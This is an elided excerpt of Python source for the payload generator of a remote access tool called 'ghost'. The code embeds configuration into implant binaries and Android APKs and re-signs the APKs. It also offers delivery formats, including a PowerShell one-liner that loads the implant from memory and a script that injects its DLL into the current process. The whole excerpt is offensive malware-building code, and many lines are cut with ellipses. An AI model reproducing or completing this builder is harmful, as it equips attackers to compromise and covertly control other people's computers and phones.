...
from ghost.ghostlib.utils.listener import get_listener_ip, get_listener_port
from ghost.ghostlib.utils.jarsigner import jarsigner
from ghost.ghostlib.payloads import dependencies
from ghost.ghostlib.utils.arch import make_template_arch
from ghost.ghostlib.payloads.dotnet import dotnet_serve_payload, DotNetPayload
from ghost.ghostlib.payloads.py_oneliner import (
...
from ghost.ghostlib.GhostOutput import (
    Success, Warn, Error, List, Table, MultiPart, Color, Info
)
from ghost.network.conf import transports, launchers
from ghost.network.lib.base_launcher import LauncherError
from ghost.scriptlets import (
...
# "https://github.com/n1nj4sec/ghost/releases"
...
def get_edit_binary(target, display, path, conf):
    ...
    if binary.find(b'OxidizedResource', 0) != -1:
        is_pyoxidizer = True
    while True:
        i = binary.find(b'####---GHOST_CONFIG_COMES_HERE---####', i+1)
        if i == -1:
            break
    ...
    ghostlib = dependencies.importer(
        target, (
            'ghost.network', 'ghost.agent'
        ), ignore_native=True, as_dict=True
    )
    
    if is_pyoxidizer:
        logger.debug("pyoxidizer binary detected")
        pyoxidizer_bootstrap = f"import marshal,ghost.agent; ghost.agent.main(config=marshal.loads({marshal.dumps(config)}))#"
        new_conf = pyoxidizer_bootstrap.encode('ascii')
        new_conf_len = len(pyoxidizer_bootstrap)
    else:
        new_conf = marshal.dumps([config, ghostlib], 2)
...
def updateTar(arcpath, arcname, file_path):
    tempdir = tempfile.mkdtemp(prefix='tmp_ghost_')
...
def get_edit_apk(target, display, path, conf):
    ...
    tempdir = tempfile.mkdtemp(prefix="tmp_ghost_")
    fd, tempapk = tempfile.mkstemp(prefix="tmp_ghost_")
...
def generate_binary_from_template(
    ...
    TEMPLATE_FMT = fmt or 'ghost{arch}{debug}-{pyver}.{ext}'

    CLIENTS = {
        'android': (get_edit_apk, 'ghost.apk', False),
...
def ghostgen(args, config, pupsrv, display):
        ...
        display(MultiPart([
            Table(
                [{
                    ...
                    'ps1', 'generate ps1 file which embeds ghost dll '
                    '(x86-x64) and inject it to current process'
                ), (
                    'ps1_oneliner', 'load ghost remotely from memory with a '
                    'single command line using powershell'
                ), (
                    'csharp', 'generate C# source (.cs) that executes ghost'
                ), (
    ...
    if args.format == 'client' or args.format=='pyoxidizer':
        ...
        if conf['launcher'] in ['connect', 'auto_proxy']:
            from ghost.ghostlib.payloads.ps1_oneliner import serve_ps1_payload
            ...
            from ghost.ghostlib.payloads.ps1_oneliner import send_ps1_payload
...
def main():
    from ghost.ghostlib.utils.term import as_term_bytes
    ...
    try:
        ...
        ghostgen(args, config, None, display)
